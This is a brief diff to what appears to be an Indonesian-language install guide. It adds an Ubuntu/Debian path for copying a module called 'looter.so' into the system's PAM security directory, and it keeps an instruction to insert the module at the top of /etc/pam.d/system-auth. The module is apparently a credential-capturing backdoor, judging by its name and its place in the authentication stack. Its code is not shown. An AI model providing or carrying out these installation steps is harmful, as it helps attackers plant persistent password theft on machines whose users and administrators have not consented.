@@ -29,6 +29,9 @@ make
 # Untuk sistem 64-bit (RHEL/CentOS/Rocky)
 sudo cp looter.so /lib64/security/
 
+# Untuk sistem Ubuntu/Debian
+sudo cp looter.so /lib/security/
+
 sudo nano /etc/pam.d/system-auth
 
 # Tambahkan di bagian atas file
